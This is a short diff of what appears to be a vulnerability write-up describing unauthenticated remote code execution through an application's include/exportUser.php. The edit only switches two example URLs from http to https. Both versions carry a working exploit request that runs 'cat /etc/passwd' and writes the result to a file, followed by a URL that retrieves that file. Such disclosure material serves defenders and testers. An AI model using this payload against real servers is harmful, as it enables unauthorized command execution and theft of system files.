@@ -53,13 +53,13 @@ The PHP class located in `include/class/application.class.php` is the best candi
 Since *exportUser.php* does not have an authentication control, it is possible for an unauthenticated attacker to implement code execution by providing the following value as an HTTP GET parameter.
 
 ```plain
-http://xxx.xxx.xxx.xxx/include/exportUser.php?type=3&cla=application&func=_exec&opt=(cat%20/etc/passwd)>test.txt
+https://xxx.xxx.xxx.xxx/include/exportUser.php?type=3&cla=application&func=_exec&opt=(cat%20/etc/passwd)>test.txt
 ```
 
 Return to 200 and visit again
 
 ```plain
-http://xxx.xxx.xxx.xxx/include/test.txt
+https://xxx.xxx.xxx.xxx/include/test.txt
 ```
 
 ![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/tm-9.png)
